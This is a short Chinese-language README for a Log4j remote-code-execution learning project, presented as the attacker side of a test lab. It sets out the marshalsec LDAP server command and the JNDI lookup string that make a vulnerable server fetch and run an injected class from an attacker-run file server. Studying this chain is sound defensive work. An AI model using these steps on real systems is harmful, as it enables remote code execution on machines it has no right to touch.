## Apache-Log4j Rce learning

该项目仅限测试使用,该项目是攻击者工程。项目分为两个部分:
1. 文件服务器
2. ldap服务器(ldapserver/marshalsec-0.0.3-SNAPSHOT-all.jar)

### 环境说明

由于高版本的 jre 内部会自动组织远程注入，因此该项目的测试的被攻击者环境jre 为 1.8.0_181 测试通过，可复现

### 文件说明

1. `InjectionFile.class` 被攻击服务器执行的代码
2. `marshalsec-0.0.3-SNAPSHOT-all.jar` ldap服务
3. `Log4jInjectionServerApplication` class文件提供服务

### 步骤

1. 运行 `Log4jInjectionServerApplication` 文件服务(端口10806)，该服务会将 `loadfile` 文件夹下的文件提供http下载
2. 运行 `marshalsec-0.0.3-SNAPSHOT-all.jar` ldap服务(端口10807)
   ，运行命令参考 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:10806/files/#InjectionFile 10807`
3. 让被攻击服务器打印出 `${jndi:ldap://localhost:10807/InjectionFile}`